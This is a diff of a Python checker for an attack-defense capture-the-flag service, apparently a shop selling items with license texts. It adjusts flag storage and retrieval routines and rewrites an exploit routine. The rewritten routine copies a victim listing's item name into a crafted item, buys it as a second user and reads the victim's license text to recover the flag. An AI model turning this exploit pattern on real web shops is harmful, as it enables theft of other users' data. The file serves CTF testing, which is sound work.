@@ -1,10 +1,12 @@
 import secrets
+from sqlite3 import threadsafety
 from httpx import AsyncClient
 from util import *
 from essential_generators import DocumentGenerator
 import html
 from datetime import datetime
 from bs4 import BeautifulSoup
+from time import time
 
 from enochecker3 import(
     ChainDB,
@@ -22,6 +24,7 @@ from enochecker3 import(
 
     #HAVOC-Message-Tasks
     HavocCheckerTaskMessage,
+    ExploitCheckerTaskMessage,
 )
 
 from enochecker3.utils import FlagSearcher, assert_equals, assert_in
@@ -54,12 +57,12 @@ async def putflag_license(task: PutflagCheckerTaskMessage, client: AsyncClient, 
     logger.debug(f"Time - putflag_license (create_ShopItem) {d2.total_seconds()} s")
     shop_listing_kwargs = {
         'item_id': item_id,
-        'item_price': 2147483646,
+        'item_price': random.randint(1825361100,2147483646),
         'description': html.escape(gen.sentence()),
         'username': user['username'],
         'password': user['password1'],
     }
-    logger.debug(f"ID={task.task_chain_id} PUTFLAG_LICENSE: username:{user['username']} , password: {user['password1']} , item_name: {item_name}")
+    logger.debug(f"PUTFLAG_LICENSE: username:{user['username']} , password: {user['password1']} , item_name: {item_name}")
     listing_id = await create_ShopListing(client=client,logger=logger,db=db,kwargs=shop_listing_kwargs)
     t4 = datetime.now()
     d3 = t4-t3
@@ -68,14 +71,14 @@ async def putflag_license(task: PutflagCheckerTaskMessage, client: AsyncClient, 
     t5 = datetime.now()
     d4 = t5-t4
     logger.debug(f"Time - putflag_license (logout_user) {d4.total_seconds()} s")
-    await db.set("flag", task.flag)
     await db.set("item_id", item_id)
+    await db.set("listing_id", listing_id)
     await db.set("user", {'user':user['username'],'password':user['password1']})
     t6 = datetime.now()
     d5 = t6-t5
     logger.debug(f"Time - putflag_license (create_ShopListing) {d5.total_seconds()} s")
     logger.debug(f"PUTFLAG_LICENSE - Total time {(t6-t1).total_seconds()} s")
-    return json.dumps({'item_id':item_id})
+    return json.dumps({'listing_id':listing_id})
 
 
 @checker.getflag(0)
@@ -87,14 +90,8 @@ async def getflag_license(task: GetflagCheckerTaskMessage, client: AsyncClient, 
         raise MumbleException("Could not retrieve USER from ChainDB!")
 
     try:
-        flag = await db.get("flag")
-    except KeyError:
-        raise MumbleException("Could not retrieve FLAG from ChainDB!")
-    if flag != task.flag:
-        raise MumbleException(f"Flags with task_chain_id={task.task_chain_id} are different (DB and task)!")
-
-    try:
         item_id = await db.get("item_id")
+        listing_id = await db.get("listing_id")
     except KeyError:
         raise MumbleException("Could not retrieve ITEM_NAME from ChainDB!")    
 
@@ -104,14 +101,19 @@ async def getflag_license(task: GetflagCheckerTaskMessage, client: AsyncClient, 
     }
     await login(client=client,logger=logger,db=db,kwargs=login_kwargs)
     try:
-        logger.debug(f"REQUESTURL: {client.base_url} user_items/{item_id}")
-        response = await client.get(f'user_items/{item_id}',follow_redirects=True)
+        logger.debug(f"REQUESTURL: {client.base_url} user_items/{item_id}/")
+        response = await client.get(f'user_items/{item_id}/',follow_redirects=True)
     except RequestError:
-        raise MumbleException("Error while retrieving user items!")
-    
+        raise MumbleException("GETFLAG_LICENSE  - Item didnt got created!")
     try:
-        logger.debug(f"REQUESTURL: {client.base_url} user_items/license/{item_id}")
-        response = await client.get(f"user_items/license/{item_id}",follow_redirects=True)
+        logger.debug(f"REQUESTURL: {client.base_url} shop/item/{listing_id}/")
+        response = await client.get(f'shop/item/{listing_id}/',follow_redirects=True)
+    except RequestError:
+        raise MumbleException("GETFLAG_LICENSE  - Item is not enlisted!")
+  
+    try:
+        logger.debug(f"REQUESTURL: {client.base_url} user_items/license/{item_id}/")
+        response = await client.get(f"user_items/license/{item_id}/",follow_redirects=True)
     except RequestError:
         raise MumbleException(f"ERROR - getflag_license: VIEWING LICENSE FROM ITEM_ID: {item_id} !")
     await logout_user(client=client,logger=logger,db=db,kwargs={'logged_in':True})
@@ -149,6 +151,7 @@ async def put_noise_base_functions(task: PutnoiseCheckerTaskMessage, client: Asy
     listing_id = await create_ShopListing(client=client,logger=logger,db=db,kwargs=shop_listing_kwargs)
     await logout_user(client=client,logger=logger,db=db,kwargs={'logged_in':True})
     await db.set("item_id", item_id)
+    await db.set("listing_id",listing_id)
     await db.set("user", {'user':user['username'],'password':user['password1']})
     t1= datetime.now()
     logger.debug(f"PUT_NOISE_BASE - Total time {(t1-t0).total_seconds()} s")
@@ -160,9 +163,10 @@ async def get_noise_base_functions(task: GetnoiseCheckerTaskMessage, client: Asy
     try: 
         user = await db.get("user")
         item_id = await db.get("item_id")
+        listing_id = await db.get("listing_id")
     except KeyError:
         raise MumbleException("Could not retrieve data from ChainDB!")
-    
+   
     login_kwargs={
         'username': user['user'],
         'password': user['password'],
@@ -171,10 +175,17 @@ async def get_noise_base_functions(task: GetnoiseCheckerTaskMessage, client: Asy
     await login(client=client,logger=logger,db=db,kwargs=login_kwargs)
 
     try:
-        logger.debug(f"REQUESTURL: {client.base_url} user_items/{item_id}")
-        response = await client.get(f'user_items/{item_id}',follow_redirects=True)
+        logger.debug(f"REQUESTURL: {client.base_url} user_items/{item_id}/")
+        response = await client.get(f'user_items/{item_id}/',follow_redirects=True)
     except RequestError:
         raise MumbleException("GET_NOISE_BASE_FUNCTIONS - Error while requesting item from user_items!")
+
+    try:
+        logger.debug(f"REQUESTURL: {client.base_url} shop/item/{listing_id}/")
+        response = await client.get(f'shop/item/{listing_id}/',follow_redirects=True)
+    except RequestError:
+        raise MumbleException("GET_NOISE_BASE_FUNCTIONS  - Item is not enlisted!")
+  
     await logout_user(client=client,logger=logger,db=db,kwargs={'logged_in':True})
     t1 = datetime.now()
     logger.debug(f"GET_NOISE_BASE - Total time {(t1-t0).total_seconds()} s")
@@ -271,41 +282,25 @@ async def havoc_default_user_params(task: HavocCheckerTaskMessage, client: Async
     logger.debug(f"HAVOC_USER_PARAMS - Total time {(t1-t0).total_seconds()} s")
 
 @checker.exploit(0)
-async def exploit_license(searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> None:
-    user1 = await register_user(client=client,logger=logger,db=None,chain_id=None)
-    min_price = 1825361099
-    cnt = 1
-    item_name =""
-    while True:
-        item_cost = 0
-        try:
-            response = await client.get(f"/shop/{1}/",follow_redirects=False)
-        except RequestError:
-            raise MumbleException("EXPLOIT - cannot request endpoint!")
-        data = BeautifulSoup(response,"html.parser")
+async def exploit_license(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> None:
 
-        links = data.find_all('a')
-        links = [link for link in links if "viewable-" in str(link)]
-        links = [str(link).split('"')[1] for link in links]
-        for link in links:
-            try:
-                response = await client.get(f"{link}",follow_redirects=False)
-            except RequestError:
-                raise MumbleException("EXPLOIT - cannot request endpoint!")
-            data = BeautifulSoup(response,"html.parser")
-            tables = data.find_all('tbody')
-            item_cost = int(str(tables[0]).split("\n")[8][4:-5])
-            if item_cost >= min_price:
-                name = data.find_all('h3')
-                item_name = str(name[0])[32:-5]   
-                break
-        cnt += 1
-        if item_cost >= min_price:
-                break
+    user1 = await register_user(client=client,logger=logger,db=None,chain_id=None)
+    logger.debug(f"EXPLOIT_LICENSE - attack info {task.attack_info}")
+    attack_info = json.loads(task.attack_info)['listing_id']
+    logger.debug(f"EXPLOIT_LICENSE - URL : {client.base_url}/shop/item/{attack_info}/")
+
+    response = await client.get(f"shop/item/{attack_info}/")
+   
+    #logger.debug(f"EXPLOIT_LICENSE - get shop_item: {response.text}")
+    data = BeautifulSoup(response.text,'html.parser')
+    name = data.find_all('h3')
+    item_name = str(name[0])[32:-5]
+
+    logger.debug(f"EXPLOIT_LICENSE - item_name: {item_name}")
     exploit_name = await make_item_name_exploitable(item_name)
     shop_item_kwargs =  {
         'data_path': '/frog.png',
-        'item_name': html.escape(exploit_name),
+        'item_name': exploit_name,
         'logged_in': True,
         'flag_str': "I STOLE A FLAG",
         'username': user1['username'],
@@ -317,17 +312,21 @@ async def exploit_license(searcher: FlagSearcher, client: AsyncClient, logger: L
         'item_id': item_id,
         'item_price': 1,
         'description': html.escape(gen.sentence()),
-        'username': user2['username'],
-        'password': user2['password1'],
+        'username': user1['username'],
+        'password': user1['password1'],
     }
     listing_id = await create_ShopListing(client=client,logger=logger,db=None,kwargs=shop_listing_kwargs)
     await logout_user(client=client,logger=logger,db=None,kwargs={'logged_in':True})
 
 
     user2 = await register_user(client=client,logger=logger,db=None,chain_id=None)
-    #http://localhost:8010/shop/item/108034/
     try:
-        response = await client.get(f"shop/item/{listing_id}",follow_redirects=True)
+        response = await client.get(f"shop/item/purchase/{listing_id}/",follow_redirects=True)
+    except RequestError:
+        raise MumbleException("EXPLOIT - cannot request endpoint!")
+    
+    try:
+        response = await client.get(f"user_items/",follow_redirects=True)
     except RequestError:
         raise MumbleException("EXPLOIT - cannot request endpoint!")
     
@@ -338,12 +337,14 @@ async def exploit_license(searcher: FlagSearcher, client: AsyncClient, logger: L
       if item_name in str(r_link):
         correct_link = str(r_link)
         break
+    logger.debug(f"EXPLOIT_LICENSE - item_link {correct_link}")
     correct_item_id = correct_link.split('"')[1]
-
+    logger.debug(f"EXPLOIT_LICENSE - exploited_item_id {correct_item_id}")
     try:
-        response = await client.get(f"user_items/license/{correct_item_id}")
+        response = await client.get(f"user_items/license/{correct_item_id}/")
     except RequestError:
         raise MumbleException("EXPLOIT - cannot request endpoint!")
+    logger.debug(f"EXPLOIT_LICENSE - license_text: {response.text}")
 
     if flag := searcher.search_flag(response.text):
         return flag
